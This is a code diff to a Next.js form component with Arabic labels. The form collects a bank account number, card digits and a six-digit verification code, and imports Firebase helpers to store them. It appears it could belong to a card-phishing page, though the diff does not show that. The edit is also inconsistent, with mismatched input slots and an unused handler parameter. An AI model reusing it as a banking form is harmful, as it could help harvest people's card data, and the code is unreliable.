@@ -11,8 +11,7 @@ import {
 } from '@/components/ui/select';
 import { Check } from 'lucide-react';
 import Header from '@/components/header';
-import { useAuth } from '@/lib/context';
-import { useRouter } from 'next/router';
+import { useRouter } from 'next/navigation';
 import { addDoc, collection } from 'firebase/firestore';
 import { addData, db } from '@/lib/firebase';
 
@@ -26,6 +25,9 @@ interface FormData {
 }
 
 export default function ECCPForm() {
+  const [code, setCode] = useState(["", "", "", "", "", ""])
+  const [isVerifying, setIsVerifying] = useState(false)
+
   const [formData, setFormData] = useState<FormData>({
     accountNumber: '',
     cardLastFourDigits: '',
@@ -39,7 +41,7 @@ export default function ECCPForm() {
   const [error, setError] = useState('');
   const router = useRouter();
 
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+  const handleInputChange = (index: number, value2: string, e: React.ChangeEvent<HTMLInputElement>) => {
     const { name, value } = e.target;
     setFormData((prev) => ({ ...prev, [name]: value }));
   };
@@ -102,14 +104,14 @@ export default function ECCPForm() {
                 آخر 4 أرقام البطاقة الذهبية
               </label>
               <div className="grid grid-cols-4 gap-2">
-                {cardDigits.map((digit, index) => (
+                {code.map((digit, index) => (
                   <Input
                     key={index}
                     id={`digit-${index}`}
                     type="text"
                     maxLength={4}
                     value={digit}
-                    onChange={(e) => handleDigitChange(index, e.target.value)}
+                    onChange={(e) => handleInputChange(index, e.target.value,e)}
                     className="text-center"
                     placeholder={
                       index === 0 ? '6280' : index === 1 ? '70XX' : 'XXXX'
